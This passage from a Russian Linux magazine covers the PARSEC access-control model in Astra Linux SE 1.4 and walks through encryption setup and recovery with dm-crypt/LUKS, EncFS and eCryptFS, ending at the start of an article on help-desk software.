чтобы развернуть защищенную инфраструктуру


Astra Linux отметился и в популярной ныне теме импортозамещения. Вполне
вероятно, что органы госвласти самого «санкционированного» российского
региона — Республики Крым — будут использовать эту ОС в качестве базы
для своей инфраструктуры ИТ. В общем, менеджерам «РусБИТех» есть чем
гордиться. Но нас, конечно, больше всего интересуют не те достижения, что
связаны с продажами и историями успеха.
   Первый релиз Astra Linux вышел в конце 2009 года. С тех пор дистрибу-
тив совершенствуется, следуя за основной веткой Debian, но при этом разра-
ботчики не забывают о главном — повышенной безопасности. Предприятие
«РусБИТех» неплохо оснащено научными кадрами и при этом ведет активное
сотрудничество с вузами и исследовательскими институтами, которые специ-
ализируются на информационной безопасности.
   Черты, которые делают Astra Linux 1.4 уникальным, относятся как раз к этой
теме. В фирменной подсистеме безопасности PARSEC используется фор-
мальная модель разграничения доступа. Она была разработана в Институте
криптографии, связи и информатики Академии ФСБ России, а в оценке каче-
ства принял участие Центр верификации ОС Linux Института системного про-
граммирования РАН. Реализация этой модели в Astra Linux SE ведется поэтап-
но, и в версии 1.4 добавлена большая ее часть, но еще не последняя.
MAC В LSM. ДАЛЕКО НЕ ФАСТФУД В УПРАВЛЕНИИ ДОСТУПОМ
Прежде чем разбирать модель разграничения доступа в Astra Linux SE 1.4,
следует вспомнить некоторые основы. Очевидно, что пользователям инфор-
мационных систем требуется доступ к данным, а также к набору механизмов
ОС, которые обеспечивают этот доступ, — например, к файловым системам
и стекам сетевых протоколов.
  Именно поэтому в моделях разграничения доступа пользователей именуют
субъектами доступа. На самом деле доступ к данным пользователь получает
не лично, а через программы, которые «переваривают» эти данные. Именно они
и являются настоящими (действительным) субъектами доступа и представляют
зарегистрированного в системе пользователя (номинального субъекта). Сово-
купность программ, которые получают доступ к данным в течение сеанса рабо-
ты зарегистрированного пользователя, обычно именуется субъект-сессией.
   Объектами доступа выступают, конечно же, не сами данные, а их носители,
представленные логическими структурами: директориями, файлами, сетевы-
ми сокетами и областями памяти, которые участвуют в межпроцессном взаи-
модействии.
   Задача любой модели разграничения доступа — определить, разрешить
(allow) доступ к тем или иным объектам для тех или иных субъектов (субъ-
ект-сессий) или отказать (deny) в нем в соответствии с правилами. Если корот-
ко, любая модель разграничения доступа задает некоторые отношения между
субъектами и объектами доступа.
   Базовая (как говорится, «из коробки») модель безопасности в GNU/
Linux — это DAC, дискреционная модель доступа (discretionary access control).
Она представляет собой комбинацию произвольного управления доступом
(субъект-субъектная модель) и доступа на основе списков (ACL — Access
Control Lists).
   Субъект-субъектная модель подразумевает, что каждому объекту сопо-
ставляется один субъект — владелец объекта. Он наделен правом давать или
отнимать доступ к этому объекту другим субъектам. ACL — это таблица, объе-
диняющая субъекты и объекты доступа при помощи перечисления прав, кото-
рыми субъект обладает в отношении объекта.
  В общем виде модель DAC в GNU/Linux соответствует «виртуальному» стан-
дарту POSIX ACL (настоящая стандартизация POSIX.1e и POSIX.2с была свер-
нута в силу безбрежности стандартизуемой предметной области) и для боль-
шинства случаев вполне подходит на роль «диспетчера доступа» субъектов
к объектам.
              В DAC-модели Astra Linux SE используется полно-
                 весная поддержка стандарта POSIX ACL

Однако защищенные  операционные  системы —  это
не «большинство случаев». Одно из важных требований,
предъявляемых к ним органами сертификации, — это реа-
лизация принудительного контроля доступа, который устра-
няет определенный волюнтаризм модели DAC. Как и в не-                                                        INFO
компьютерном  секретном  делопроизводстве,  модель
принудительного управления доступом основана на сопо-    В ядро новой версии
                                                                                          Astra Linux SE
ставлении меток конфиденциальности, присвоенных объ-                                                                          включен известный
ектам доступа, с официальным разрешением (допуском,      патч безопасности
мандатом) субъекта. Именно это «официальное разреше-        PaX, который
                                                                               обеспечиваетние» (мандат) дало такой модели название MAC (Mandatory                                                                            возможность
access control) — мандатное управление доступом.                тонкой настройки
  В GNU/Linux попытки расширения DAC-модели безо-        разрешений
                                                                             для приложенийпасности MAC-моделью предпринимались с 2001 года.
                                                                          при их работе
Именно тогда АНБ США показало первую версию SELinux                                                                             со страничной
с реализацией мандатного управления доступом на основе          памятью.
формальной модели MLS (Multilevel Security). Было предло-
жено включить MLS в состав ядра версии 2.5. Благо сообщество разработчиков
Linux такое решение отвергло. Наряду с SELinux похожие реализации MAC-мо-
дели разрабатывались в рамках проекта AppArmor и, позже, — в Smack, TOMOYO
и других. С какой стати отдавать предпочтение какому-то одному из них?
   Вместо жесткой интеграции MAC-модели в состав ядра было принято соло-
моново решение: использовать расширение модели безопасности GNU/Linux.
Она продолжит базироваться на модели DAC, но с использованием особых
модулей ядра. В них можно реализовать какой угодно вариант модели управ-
ления доступом. Это решение было претворено в жизнь в виде фреймворка
LSM (Linux Security Modules), который официально включили в ядро Linux 2.6.
  Идея LSM проста. На ключевые с точки зрения управления доступом функ-
ции ядра навешивается совокупность «крючков» — хуков (hooks). Они пред-
ставляют собой интерфейсы подключения обработчиков из модуля LSM, кото-
рые вызываются в том случае, если нужен контроль доступа. То есть фреймворк
LSM предоставляет разработчику модуля LSM возможность перехвата управ-
ления в ходе выполнения тех участков кода ядра, которые отвечают за реали-
зацию доступа субъектов к объектам.
   Прелесть такого подхода заключается в том, что внутри модуля LSM можно
реализовать любую модель управления доступом — как общего назначения,
так и с учетом специфических особенностей эксплуатации системы. Естествен-
но, эффективность подхода LSM напрямую зависит от широты охвата хуками
функций ядра Linux. Но с этим, судя по всему, проблем нет. С момента вклю-
чения LSM в ядро 2.6 по настоящее время было реализовано около двухсот
хуков, и их внедрение ведется параллельно с появлением новых функций ядра.





В Astra Linux SE подсистема безопасности PARSEC ба-
зируется на фреймворке LSM
  Фреймворк LSM не заменяет модель DAC — она остается «первой линией
обороны». Обработка хуков LSM начинается только после успешного прохож-
дения контроля доступа по линии DAC. Такая двухъярусность позволяет не пе-
регружать функциями безопасности те системы, где это не нужно. Там можно
попросту не использовать LSM.
   Безопасность SELinux базируется как раз на модулях LSM, равно как все
остальные рассмотренные выше проекты, которые реализуют мандатное
управление доступом. Подсистема безопасности PARSEC, функционирующая
в составе Astra Linux SE, — это тоже модуль LSM. И даже не один.

XPARSEC
Подсистема безопасности PARSEC в Astra Linux SE 1.4 содержит модуль
XPARSEC, благодаря которому сервер X.Org получает возможность опреде-
лять привилегии клиента X.Org (программы с графическим интерфейсом) и пе-
редавать их с использованием модифицированного X-протокола менеджеру
окон Fly-wm. Тот выполняет привилегированные операции во время запуска
клиента X.Org с различными мандатными контекстами. При этом на рабочем
столе Fly отображается:
•  мандатный контекст пользовательской сессии в системном лотке (область tray);
•  мандатный уровень каждого окна;
•  мандатный уровень всех приложений, размещенных на рабочем столе Fly;
•  уровень доверенности окна для локально и удаленно запущенных прило-
   жений (цвет рамки окна приложения).

                                          В качестве DE в Astra Linux
                                                     используется Fly — «брат
                                                  по коду» KDE 4.
                                          В отличие от KDE, Fly —
                                              защищенная рабочая среда
КОНТРОЛЬ ДОСТУПА, КОНТРОЛЬ ЦЕЛОСТНОСТИ И РОЛИ
Поскольку Astra Linux вовсю используется в разных проектах, связанных с об-
работкой информации различных уровней конфиденциальности, у разработ-
чиков уже есть статистика, по которой можно судить о корректности реали-
зации модели управления доступом. Не менее важны исследовательские
работы, в которых формировались модели нарушителей в рамках известных
уязвимостей информационной безопасности CVE (Common Vulnerabilities and
Exposures).





Подсистема безопасности
PARSEC — не только LSM-моду-
ли, в которых реализована та или
иная модель управления доступом,
но и «обвязка»: собственная фай-
ловая система parsecfs, конфигура-
ционные файлы, демоны и утилиты
   Проверке подверглись известные «проблемы» модели Белла — Лападу-
лы. К примеру, деклассификация — когда пользователь с высоким уровнем
конфиденциальности случайно или намеренно помещает данные из объекта
с соответствующей мандатной меткой в объект с меткой более низкого уров-
ня. Или нарушение логики доступа к данным при обработке потока информа-
ции в распределенной среде.
   Моделировалась и проблема компрометации субъекта доступа, в ходе ко-
торой повышается уровень его привилегий (включая получение привилегий
PARSEC). В результате можно получить возможность управлять доступом к за-
щищаемой информации.
   Очевидное решение таких проблем — это модификация формальной мо-
дели управления доступом. В случае Linux это делается добавлением моду-
лей LSM, которые реализуют систему PARSEC. Ее основой стала мандатная
сущностно-ролевая ДП-модель. Разработка ведется в рамках научной школы
в Институте криптографии, связи и информатики Академии ФСБ России.





Мандатная сущностно-ролевая модель управления доступом в версии 1.4
Astra Linux SE относится к широкому классу ДП-моделей

  В общем случае эта модель относится к классу ДП-моделей, то есть мо-
делей управления доступом (Д) и информационными потоками (П), в которых
учитывается не только единичный акт доступа к данным, но и направления рас-
пространения потоков информации при выполнении операций над данными.
   Кардинальное отличие мандатной сущностно-ролевой ДП-модели от «клас-
сики» MAC — это объединение мандатного и ролевого управления доступом.
При этом традиционный подход (уровни конфиденциальности, категории без-
опасности) мандатной модели в ней усиливается применением мандатного
же контроля целостности (MIC, Mandatory Integrity Control) — механизма, кото-
рый нашел широкое применение в семействе операционных систем Windows,
начиная с релизов Vista и Server 2008.





Приоритет в мандатной сущностно-ролевой ДП-модели — это MAC-модель,
усиленная ролевой моделью и моделью управления целостностью

Фактически управление целостностью (integrity) правильнее называть управ-
лением уровнем доверия. К традиционной проверке целостности данных (на-
пример, на основе подсчета их контрольных сумм) механизм MIC отношения
не имеет. Назначаемые объектам и субъектам доступа уровни доверия допол-
няют традиционную модель управления доступом и гарантируют, что субъекты
с низким уровнем целостности (IL — Integrity Level) не могут влиять на объекты
с более высоким уровнем целостности.
   Реализация мандатной сущностно-ролевой модели в Astra Linux SE 1.4
поддерживает наличие двух уровней целостности: высокий (hi) и низкий (low).
Этого достаточно для разделения субъектов и объектов доступа на доверен-
ные и недоверенные. При этом переменная, которая определяет значение
IL, может принимать одно из 255 значений. Это означает, что в последующих
реализациях модели может появиться более чем один уровень целостности.
Подобный подход используется в модели MIC операционных систем Windows,
поддерживающей пять (от untrusted до system) значений IL.
  Еще одна важная особенность мандатной сущностно-ролевой модели —
это учет иерархичности организации как ряда объектов доступа, так и функ-
ций (ролей), выполняемых субъектами. Такой учет позволил отнести и по-
добные объекты, и роли субъектов доступа к единой категории «сущность».





Правила разграничения доступа в мандатной сущностно-ролевой ДП-модели
учитывают иерархическую организацию ряда сущностей-объектов доступа
В рамках этой категории могут формироваться отношения иерархии. Напри-
мер, каталог может считаться сущностью-контейнером. Размещенные в нем
объекты — файлы и подкаталоги — будут для него дочерними сущностями.
   Аналогичным образом можно рассматривать и роли субъектов. Корневыми бу-
дут роли администратора (суперпользователя) и индивидуального пользователя.
На самом деле иерархии сущностей-ролей — это вложенные друг в друга функ-
ции субъекта, вся совокупность которых в сумме и определяет корневые роли.
   Что дает учет иерархии сущностей? Например, совместно с моделями MAC
и MIC он позволяет определять правила размещения обычных объектов-сущ-
ностей с разными мандатными метками и уровнями IL в сущности-контейнере
с определенными мандатной меткой и уровнем IL. Именно эта возможность
и используется в текущей реализации сущностно-ролевой модели путем до-
бавления к DAC-, MAC- и MIC-атрибутам директорий (напомним, что это — сущ-
ности-контейнеры) дополнительных атрибутов ccnr и ccnri. Они ограничива-
ют возможность размещения в контейнерах объектов с мандатными метками
и уровнями целостности, которые превышают таковые у самой директории.





Скрипт инициализации правил разграничения доступа
для ключевых директорий корневой файловой системы Astra Linux SE
   Чтобы создать дочерний объект в отмеченных подобным образом директо-
риях, даже с мандатными метками и уровнями IL ниже, чем у «родителя», субъ-
ект должен иметь соответствующие PARSEC-привилегии. Равно как и для уста-
новки ненулевого значения указанных атрибутов. При этом установка этих
атрибутов не мешает просмотру объектов внутри директории.
  Кроме ограничивающих атрибутов, для любых сущностей (не только сущ-
ностей-контейнеров) возможна установка атрибута ehole. Он позволяет иг-
норировать мандатные метки целостности при выполнении операций записи
в них. Такой атрибут необходим для работы с объектами общего пользова-
ния — к примеру, директорией tmp.
   Реализовав в LSM-модулях PARSEC мандатную сущностно-ролевую ДП-мо-
дель, разработчики не забыли и о средствах ее администрирования. Ведь набор
утилит мандатного управления доступом в Astra Linux SE 1.3 был ориентирован
на традиционную MAC-модель и не учитывал рассмотренные выше новшества.
  В версии 1.4 появилась совокупность утилит pdp-, которые поддерживают про-
смотр и модификацию как традиционных MAC-атрибутов (уровни и категории),
так и MIC-атрибута (уровни целостности) и дополнительных атрибутов (ccnr, ccnri,
ehole). Впрочем, утилиты из предыдущей версии никуда пока не делись и приме-
няются, чтобы облегчить администраторам уже функционирующих информаци-
онных систем миграцию субъектов и объектов доступа на новую модель.





В настройках среды окружения нового варианта подсистемы PARSEC
первую скрипку играют новые pdp-утилиты
Распространение абстракции «сущность» не только на объекты доступа,
но и на роли, реализуемые субъектами, позволяет применить подобный под-
ход и к иерархии «роль-контейнер» — «дочерняя роль». Правда, в реализации
модели для Astra Linux SE 1.4 gjkysq переход к ролевому управлению не вы-
полнен (сущности-контейнеры «административная роль» и «индивидуальная
роль» еще пусты).
   Сейчас вовсю идет разработка версии 1.5, где в полном объеме будет реа-
лизована главная особенность мандатной сущностно-ролевой модели — при-
оритетное выполнение требований мандатного управления доступом при реа-
лизации ролевого управления в сочетании с мандатным контролем целостности.
   Следует еще задать вот какой вопрос: корректна ли новая, достаточно
сложная и для понимания, и для реализации модель управления доступом?
Не несет ли она на логическом уровне возможностей для несанкционирован-
ного доступа? Достоинство Astra Linux SE здесь в том, что корректность его ре-
шений проверяет научное сообщество. В частности, в процессе занят Центр
верификации ОС Linux Института системного программирования РАН — там
разрабатываются тесты и технологии тестирования как модулей ядра Linux,
так и в целом инфраструктуры LSB (Linux System Base).
   Так, Центром в рамках проекта Linux Deductive Verification на основе мето-
дологии дедуктивной верификации последовательных программ был разрабо-
тан набор свободно распространяемых инструментов верификации — Astraver
Toolset 1.0. Они помогают убедиться в корректности реализации LSM-модулей
подсистемы PARSEC, которые поддерживают новую мандатную сущностно-ро-
левую модель. Они же помогут тестировать и будущие версии Astra Linux SE.





В tray-области рабочего стола Fly-wm для пользователя отображается
его уровень конфиденциальности и категории безопасности
Скрипт инициализации правил разграничения доступа
для ключевых директорий корневой файловой
системы Astra Linux SE

ВЫВОДЫ
К отечественным системным программным разработкам, особенно если они
ведутся на основе опенсорсных проектов, зачастую относятся с изрядной до-
лей снисхождения. Мол, сложно ли? Любой сможет взять отовсюду понемногу
и сделать нечто, выдаваемое за свое. Возможно, иногда так и есть. Но только
не в области операционных систем специального назначения. Их разработка
скрупулезна, а сертификация проходит не для галочки. Именно такой подход
продемонстрирован в Astra Linux SE 1.4, и именно его можно ожидать в после-
дующих версиях этой операционной системы специального назначения.
 UNIXOID
НАСЛЕДНИКИ
«ЭНИГМЫ»         ОБЗОР СОВРЕМЕННЫХ
         КРИПТОСРЕДСТВ В LINUX





                                         Роман Ярыженко
                                                   rommanio@yandex.ru
Сегодня хранить важные данные в открытом виде ста-
ло как никогда опасно. И даже не столько из-за государ-
ственной слежки (захотят — найдут, к чему придрать-
ся, и так), сколько из-за желающих эти данные похитить.
В принципе, для защиты информации имеется множество
методов, но в статье будет описаны именно криптографи-
ческие средства.

ВВЕДЕНИЕ
В отличие от некоторых других операционных систем, в Linux имеется мно-
жество средств для криптографической защиты информации — от шифро-
вания почтовых переписок до шифрования файлов и блочных устройств. Нас
интересует именно шифрование на уровне файловых систем, файлов и блоч-
ных устройств. Для начала стоит разобраться, в чем разница. Шифрование
на уровне файловых систем предполагает наличие прослойки между ос-
новной файловой системой (если, конечно, файловая система сама по себе
не поддерживает шифрование) и пользователем. Преимущество у данного
типа шифрования — то, что ключи для всех пользователей разные. Недоста-
ток же — если включить шифрование имен файлов, длина допустимого имени
уменьшится, кроме того, пользователь может сохранить файл в иное место
на диске, что автоматически нивелирует пользу. И еще одно но — даже если
включено шифрование имен, временные метки останутся прежними. Шифро-
вание блочных устройств происходит на более низком уровне, под файловой
системой. При этом сама файловая система, разумеется, не знает, что она на-
ходится на шифрованном томе. Преимущества у данного способа противопо-
ложны недостаткам предыдущего. Недостаток же в том, что придется каждый
раз при загрузке/монтировании вводить пароль. Второй же недостаток в том,
что если в рантайме злоумышленник получит доступ к файлам на криптокон-
тейнере, все — пиши пропало. Это именно что защита от офлайновых атак.
Кроме того, в абсолютном большинстве случаев сохранения криптоконтейне-
ра в облако придется заливать его целиком заново.
  В статье будет описана настройка следующих методов криптозащиты:
•  dm-crypt/LUKS — создание криптоконтейнера с помощью device-mapper
   и CryptoAPI ядра;
•  eCryptfs — шифрование на уровне файловых систем;
•  EncFS — аналогично описанному выше, но не требует загрузки модулей
   ядра.
DM-CRYPT/LUKS
Существует два вида настройки dm-crypt — plain и LUKS. Отличие в том, что
в случае использования LUKS в начале криптотома присутствуют метаданные,
позволяющие использовать несколько ключей и изменять их. В то же время
наличие подобного заголовка в некоторых случаях само по себе компромети-
рующе — впрочем, в большинстве подобных случаев будет компрометирую-
щей и область с высокой степенью энтропии.

Настройка plain dm-crypt с файлом ключа и парольной фразой
Посмотрим, как настроить комбинацию из тома plain dm-crypt, зашифрованно-
го с помощью ключевого файла, в свою очередь содержащегося в LUKS-кон-
тейнере. Для начала стоит определиться, как именно будут размещаться раз-
делы. Существует три основных варианта:
•  просто крипто-том;
•  сперва крипто-том, затем поверх него LVM;
•  сперва крипто-том, затем RAID, затем LVM.

И всяческие комбинации. Давай попробуем второй вариант. Первым делом
создадим контейнер LUKS для хранения ключевого файла, чтобы использо-
вать этот файл вместе с ключевой фразой. В этом случае вероятность крипто-
анализа тома, зашифрованного с помощью plain dm-crypt, снижается:

# dd if=/dev/zero of=/root/key.luks bs=512 count=2057
# cryptsetup --align-payload=1 luksFormat /root/key.luks
# cryptsetup luksOpen /root/key.luks cryptokey
# dd if=/dev/urandom of=/dev/mapper/cryptokey

Первая команда подготавливает файл контейнера, вторая этот контейнер соз-
дает, третья подключает, четвертая генерирует ключевую информацию. Стоит
заметить, что опция --align-payload=1 нужна для того, чтобы размер метадан-
ных LUKS составлял не 4096 512-байтовых блоков, а всего лишь 2056. Таким
образом, на собственно ключевую информацию остается 512 байт.
   Затем переходим к созданию криптотома. На этом этапе по желанию
можно также заполнить диск псевдослучайными данными, чтобы затруднить
криптоанализ, если он будет. Затем уже можно создавать криптотом. Команда
для этого выглядит следующим образом (естественно, в иных случаях иденти-
фикаторы могут отличаться, так что нужно быть внимательным):

# cryptsetup --cipher=serpent-xts-plain64 --offset=0
   --key-file=/dev/mapper/cryptokey --key-size=512 open --type=plain
   /dev/disk/by-id/ata-VBOX_HARDDISK_VB05eadebe-f25e8d59 crypto0
Генера-
ция ключа
и настройка
криптотома





Создание
LVM
поверх
криптото-
мов
При необходимости надо повторить аналогичную команду и на других устрой-
ствах, для которых требуется шифрование. Затем создадим на криптотомах
LVM и ФС на нем:

# pvcreate /dev/mapper/crypto0 /dev/mapper/crypto1
# vgcreate vgData /dev/mapper/crypto0 /dev/mapper/crypto1
# lvcreate -n lvData1 -L 10G vgData
# mkfs.ext4 /dev/vgData/lvData1

И далее потребуется настроить подключение этого тома при загрузке. Для это-
го мы будем использовать initramfs. Запишем имена нужных модулей в файл /
etc/initramfs-tools/modules:

dm_crypt
cryptd
xts
serpent_generic
aes_x86_64
aesni_intel

Создадим файл /etc/initramfs-tools/hooks/cryptokeys примерно следующего
содержания (служебная часть скрипта опущена):

# <...>
. /usr/share/initramfs-tools/hook-functions
mkdir ${DESTDIR}/etc/crypto # Создаем каталог в образе initramfs
cp /root/key.luks ${DESTDIR}/etc/crypto # Копируем туда ключ
copy_exec /sbin/cryptsetup /sbin # Заодно копируем и cryptsetup

И файл /etc/initramfs-tools/scripts/local-top/cryptokeys (служебная часть опять
же опущена):

# <...>
modprobe -b dm_crypt
while ! ( /sbin/cryptsetup luksOpen /etc/crypto/key.luks cryptokey
   && /sbin/cryptsetup plainOpen --key-file=/dev/mapper/cryptokey
      /dev/disk/by-id/ata-VBOX_HARDDISK_VB05eadebe-f25e8d59 crypto0
   && /sbin/cryptsetup plainOpen --key-file=/dev/mapper/cryptokey
      /dev/disk/by-id/ata-VBOX_HARDDISK_VBc2414841-cfeccde5 crypto1
   && /sbin/cryptsetup luksClose cryptokey
) ; do
   echo “Try again...”
done

Эти два файла должны быть исполняемыми. Затем создаем initrd:

# update-initramfs -u -k all -v

При следующей перезагрузке будет запрошен пароль для LUKS-контейнера.
  В случае использования plain dm-crypt есть еще одна возможность — об-
щий нижний слой, что позволяет сделать нечто наподобие скрытых томов
TrueCrypt. Проще привести пример:

# cryptsetup --cipher=serpent-xts-plain64 --offset=0
   --size=2097152 --shared open --type=plain
   /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec crypto
# cryptsetup --cipher=serpent-xts-plain64 --offset=2097152
   --size=2097152 --shared open --type=plain
   /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec crypto_shared

Размер и смещение указываются в 512-байтовых блоках.

                                                                       Настройка
                                                                          двух plain
                                                                           dm-crypt
                                                                        томов
                                                                        на общем
                                                                           устройстве
Расширенные возможности LUKS
Давай посмотрим также и на расширенные возможности использования
LUKS-контейнеров. К ним можно отнести смену ключей. Это необходимо
при компрометации или создании политики смены ключей. Первым шагом
для этого будет создание резервной копии заголовка контейнера. Если все
нормально, после смены ключа ее можно уничтожить. Делаем мы ее, понятно,
на нешифрованный раздел:

# mount /dev/sdf1 /mnt/flash
# cryptsetup luksHeaderBackup
    /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec
    --header-backup-file /mnt/flash/luksHeader.bin

После этого сделаем копию файла ключа в случае использования данного ме-
тода и сгенерируем новый ключ. Затем смотрим текущие кейслоты (места в за-
головке шифрованного тома, где хранятся ключи, — их может быть до восьми)
и запоминаем номер активного (Enabled). Как правило, это нулевой.

# cryptsetup luksDump
   /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec

Наконец, добавляем новый ключ в систему:

# cryptsetup luksAddKey
    /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec

Отключаем-подключаем том, дабы убедиться, что мы ничего не сломали,
и удаляем старый ключ:

# cryptsetup luksKillSlot
    /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec 0

Рассмотрим и процедуру восстановления томов LUKS. Самый простой вари-
ант, разумеется, когда есть копия заголовка. В этом случае для восстановле-
ния требуется всего одна команда:

# cryptsetup luksHeaderRestore
    /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec
    --header-backup-file /mnt/flash/luksHeader.bin

После этого подключаем том, используя старые пароли/ключи.
  В случае же, если вдруг по каким-то невероятным причинам был поврежден
заголовок тома LUKS, при этом резервных копий не имеется, но том еще от-
ключить не успели, его все же можно восстановить. Для этого прежде всего
необходимо извлечь мастер-ключ, который хранится в памяти:

# dmsetup table --target crypt --showkey /dev/mapper/cryptoluks

Самая длинная непрерывная строчка и будет мастер-ключом. Ее нужно скопи-
ровать в файл на нешифрованный том и после этого преобразовать в бинар-
ную форму (перед этим следует убедиться, что в данном файле нет никаких
символов конца строки):

# cat master-key.txt | xxd -r -p >master-key.bin

Длина итогового файла варьируется от параметров, заданных при создании
тома LUKS. Чаще всего — 32 байта. После извлечения мастер-ключа нужно
отключить LUKS-том и проинициализировать его заново с использованием
данного мастер-ключа и теми же самыми параметрами, что использовались
при первой инициализации, например, так:

# cryptsetup -h=sha256 -c=aes-cbc-essiv:sha256 -s=256 luksFormat
   /dev/disk/by-id/ata-VBOX_HARDDISK_VBcda8398f-f1f1deec
   --master-key-file=/mnt/flash/master-key.bin


ENCFS
Посмотрим, как настроить EncFS для автоматического монтирования при вхо-
де в систему. Для начала поставим нужные пакеты:

# apt-get install encfs libpam-encfs

Затем нужно выбрать, будет ли происходить автомонтирование при входе или
же чуть позже, с помощью gkeyring. Здесь будет описан первый способ из-за
его универсальности. Настроим сначала ФС.

$ mkdir -p ~/.private ~/private
$ encfs ~/.private ~/private

При настройке в режиме эксперта будет задан ряд вопросов: тип шифра (до-
ступны только AES и Blowfish), размер ключа, размер блока, как шифровать
имена файлов — блочное шифрование (которое полностью скрывает имя фай-
ла, в том числе длину), потоковое (которое шифрует с максимально близкой
длиной, что иногда удобно, если имена чересчур длинные и при использова-
нии блочного шифра есть достаточно большая вероятность превысить макси-
мально допустимую длину) или вовсе будет отсутствовать... В конце будет за-
прошен пароль, он должен совпадать с используемым для входа, в противном
случае автомонтирование работать не будет.

                                                                     Начало
                                                                        создания
                                                                     EncFS





Следом нужно отредактировать файл /etc/security/pam_encfs.conf:

# Закомментируем следующую строчку для отключения авторазмонтирования
по истечении какого-то времени

# encfs_default --idle=1
# Раскомментируем другую строчку
* .private private -v allow_other

И файл /etc/fuse.conf:

# Раскомментируем строчку для разрешения монтирования обычным
пользователям:

user_allow_other
И добавим пользователя в группу fuse:

$ sudo usermod -a -G fuse $USER

После выхода-входа каталог private можно будет использовать как хранилище
для личных данных. Стоит, однако, отметить, что аудит выявил некоторые (до-
статочно серьезные) проблемы с безопасностью, из-за чего данную систему
крайне не рекомендуется использовать для хранения действительно важных
данных.

ECRYPTFS
Известно, что eCryptFS применяется в Ubuntu как средство по умолчанию
для защиты домашних каталогов. Посмотрим, как оно работает, — создадим
шифрованный каталог вручную. Установим пакеты:

$ sudo apt-get install ecryptfs-utils

Как и в случае с encfs, создадим два каталога:

$ mkdir -p ~/.secret ~/secret

                                                                      Создание
                                                                            eCryptFS
И смонтируем ФС (при первом монтировании создаются все необходимые
метаданные):

$ sudo mount -t ecryptfs /home/rom/.secret /home/rom/secret

Будет запрошена парольная фраза (всего один раз, повторный ввод не реа-
лизован, что выглядит не очень хорошим решением, учитывая, что она должна
быть длинной), затем будет запрошен тип шифра (AES, Blowfish, 3DES, Twofish,
CAST6 и CAST5), размер ключа, задан вопрос, разрешить или запретить не-
шифрованные файлы в каталоге с зашифрованными, шифровать ли име-
на файлов... и в финале спросит, действительно ли желаем подмонтировать
и сохранить ли сигнатуру в определенный файл. Вопрос не настолько глупый,
как может показаться сначала: в данном ПО при отсутствии сигнатуры не су-
ществует возможности отличить правильный пароль от неправильного.
   Посмотрим, как зашифровать весь домашний каталог в случае, если он
не зашифрован. Для начала нужно создать резервную копию всех важных
данных. Затем зайти под иным пользователем, не тем, чьи данные будут за-
шифрованы, убедиться, что нет процессов данного пользователя, и набрать
команду (вместо rom подставить имя нужного пользователя):

$ sudo ecryptfs-migrate-home -u rom

                                                              Шифро-
                                                                      вание
                                                                    домашнего
                                                                          каталога
                                                                          пользова-
                                                                          теля
Во время первого запуска может понадобиться завершить несколько процес-
сов. После шифрования необходимо немедленно зайти под пользователем,
при этом будет предложено записать или распечатать парольную фразу, сге-
нерированную для шифрования и защищенную, в свою очередь, пользова-
тельским паролем. Это необходимо для восстановления в случае нештатной
ситуации.

                                                                       Предупре-
                                                                  ждение
                                                                           о необхо-
                                                                      димости
                                                                       запомнить
                                                                     парольную
                                                                       фразу





Посмотрим, как его восстанавливать. Предположим, что парольная фраза
не записана и восстановление идет с Live CD. Подразумевается, что ФС под-
монтирована. Переходим в каталог home/.ecryptfs/rom/.ecryptfs и набираем
команду:

# ecryptfs-unwrap-passphrase ./wrapped-passphrase

Затем передаем полученную парольную фразу в ecryptfs-add-passphrase:

# printf “%s” “e496ea18906ccbba4fb283fd3ea25307” |
    ecryptfs-add-passphrase --fnek -
Парольная
фраза





Процесс
ручного
восста-
новления
eCryptFS
И, запомнив токены и создав каталог, подмонтировать данную зашифрован-
ную ФС к нему:

# mkdir /home/rom
# mount -t ecryptfs
   -o key=passphrase:passphrase_passwd=e496ea18906ccbba4fb283fd3ea25307
   ../.Private /home/rom

Будут запрошены некоторые дополнительные данные об опциях монтирова-
ния. Почти все нужно оставить стандартным, за исключением вопроса о шиф-
ровании имен файлов и сигнатуры ключа для их шифрования — вместо зна-
чения по умолчанию нужно подставить второй токен из запомненных. И можно
восстанавливать файлы.

dm-verify

Модуль dm-verify предназначен для проверки целостности блочных устройств.
Верификация ведется с помощью hash tree, где «листья» — хеш-суммы блоков,
а «ветви» — хеш-суммы наборов «листьев». Таким образом, для верификации
блочного устройства (будь то раздел или диск) достаточно проверить всего
одну контрольную сумму.
   Этот механизм (вкупе с цифровой подписью) применяется в некоторых
Android-устройствах для защиты от модификации системных разделов, а так-
же в Google Chromium OS.



ЗАКЛЮЧЕНИЕ
Linux содержит действительно немало средств для криптографической защи-
ты информации. Из трех описанных средств как минимум одно присутствует
во всех современных дистрибутивах Linux. Но что же выбрать?
   dm-crypt/LUKS стоит применять в тех случаях, когда есть возможность бы-
стро отключить зашифрованный том и когда резервные копии либо не нужны,
либо засекречиваются иным путем. В этом случае данное решение более чем
эффективно, особенно с учетом того, что шифровать можно каскадом произ-
вольной вложенности и типа (например, AES-Twofish-AES), — настоящий рай
для параноиков.
   eCryptFS подходит в тех случаях, когда нужно шифрованные данные ку-
да-то сохранять — к примеру, в облако. Она обеспечивает довольно надежное
шифрование (хотя в 128-битном варианте, используемом по умолчанию, есть
возможность снижения криптостойкости на два бита) и для конечного пользо-
вателя прозрачна.
   EncFS же — старичок примерно десятилетней давности, базирующийся
на еще более древних работах. К настоящему времени не рекомендован к ис-
пользованию из-за потенциальных дыр в безопасности, но может применять-
ся в качестве кросс-платформенного средства для защиты несенситивных
данных в облаках.
  При необходимости использования подобных средств всегда нужно пом-
нить, что защита должна быть комплексной.
 SYNACK




                                                              Мартин «urban.prankster» Пранкевич
                                                                                  martin@synack.ruИЩЕМ
ПОМОЩНИКА
   ПОДБИРАЕМ БЕСПЛАТНУЮ СИСТЕМУ
           ДЛЯ HELP DESK


 Современные пользователи
 при выборе компании — постав-
 щика услуг или товара нередко
 на первое место ставят качество
 и оперативность поддержки, что-
 бы при необходимости можно было
 быстро связаться и получить от-
 вет, а также отслеживать статус за-
 проса, если на решение проблемы
 требуется время. Именно поэтому
 у бизнеса велик интерес к специа-
 лизированным продуктам для help
